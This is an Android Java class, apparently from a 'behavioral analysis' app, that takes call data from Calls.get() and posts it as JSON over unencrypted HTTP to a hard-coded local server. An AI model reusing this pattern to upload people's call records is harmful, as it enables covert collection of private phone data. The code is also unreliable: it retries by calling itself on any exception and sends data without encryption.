package com.behavioralanalysis.service;

import android.content.Context;
import android.graphics.Color;
import android.graphics.Typeface;
import android.os.AsyncTask;
import android.util.Log;
import android.view.Gravity;
import android.widget.TextView;
import android.widget.Toast;

import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;

import org.json.JSONObject;

import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;

import javax.net.ssl.HttpsURLConnection;

public class Sender {

    public static String baseUrl = "http://192.168.0.111:5000/api/Log/";
    public static Context context;

    public static void startAsync(Context _context) {
        showToast("startAsync");
        try {
            context = _context;
            send(Calls.get());
        } catch (Exception ex) {
            ex.printStackTrace();
            startAsync(_context);
        }
    }
    public static class AsyncSend  extends AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... params) {
            String data = "";
            HttpURLConnection httpURLConnection = null;
            try {
                httpURLConnection = (HttpURLConnection) new URL(params[0]).openConnection();
                httpURLConnection.setDoOutput(true);
                httpURLConnection.setRequestMethod("POST");
                httpURLConnection.setRequestProperty("Content-Type", "application/json; charset=utf-8");
                httpURLConnection.setRequestProperty("Accept", "application/json");
                httpURLConnection.connect();

                OutputStream os = httpURLConnection.getOutputStream();
                OutputStreamWriter osw = new OutputStreamWriter(os, "UTF-8");
                osw.write(params[1]);
                osw.flush();
                osw.close();

                BufferedReader br = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream(), "UTF-8"));
                String line = null;
                StringBuilder sb = new StringBuilder();
                while ((line = br.readLine()) != null) {
                    sb.append(line);
                }

                br.close();
                data = sb.toString();

            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                if (httpURLConnection != null) {
                    httpURLConnection.disconnect();
                }
            }
            return data;
        }
        @Override
        protected void onPostExecute(String result) {
            super.onPostExecute(result);
            Log.e("TAG", result); // this is expecting a response code to be sent from your server upon receiving the POST data
        }
    }
    public static void showToast(String msg) {
        Toast toast = Toast.makeText(context, msg, Toast.LENGTH_LONG);

        TextView view = (TextView) toast.getView().findViewById(android.R.id.message);
        view.setTextColor(Color.RED);
        view.setTypeface(Typeface.DEFAULT_BOLD);
        view.setGravity(Gravity.CENTER_VERTICAL | Gravity.CENTER_HORIZONTAL);
        toast.show();
    }

    public static void send(JSONObject toSend) {
        String urlPath = baseUrl + "raw";
        byte[] data = toSend.toString().getBytes();
        try {
            new AsyncSend().execute(urlPath, toSend.toString());

        } catch (Exception ex) {
            ex.printStackTrace();
            Toast.makeText(MainService.getContext(), ex.getMessage(), Toast.LENGTH_SHORT);
        }

/*



        try {
            JsonObjectRequest jsonObjectRequest = new JsonObjectRequest(Request.Method.POST, url, toSend, new Response.Listener<JSONObject>() {
                @Override
                public void onResponse(JSONObject response) {
                    showToast("success");
                }
            }, new Response.ErrorListener() {
                @Override
                public void onErrorResponse(VolleyError error) {
                    error.printStackTrace();
                    showToast("success");

                }
            });
        } catch (Exception ex) {
            showToast(ex.getMessage());
        }*/
    }
}
